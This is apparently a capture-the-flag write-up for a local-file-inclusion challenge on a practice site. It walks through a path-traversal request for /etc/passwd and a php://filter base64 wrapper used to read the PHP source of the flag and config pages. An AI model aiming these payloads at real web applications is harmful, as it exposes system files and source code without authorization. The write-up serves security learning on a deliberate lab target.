The target site: `https://hackme.inndy.tw/lfi/`

And check the functions provided: 
`https://hackme.inndy.tw/lfi/?page=pages/index`.
As you can see,the parameter `page` comes with path to some file defaultly.

I supposed that there is a LFI problem.

` https://hackme.inndy.tw/lfi/?page=../../../../etc/passwd `.

SO?

The source code of `pages/index` mentions: 
```
<!-- There is no flag
                <li>
                    <a href="?page=pages/flag">Flag</a>
                </li>
-->
```

BUT!

We CAN'T read `pages/flag` directly because the back-end PHP code may use some functions including file as PHP code and parsing it, such as `include`,`require` and so on.

Tricky time !

Use `filter` meta-wrapper of `php://` I/O stream to exploit the LFI vulnerability
> please visit [Wrappers](https://www.php.net/manual/en/wrappers.php.php) for more information.

`https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/flag`

The conversion filter `convert.base64-encode` help us to read the files with base64-encoding.

> [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)

Finally,

```
https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/config
```
All done !




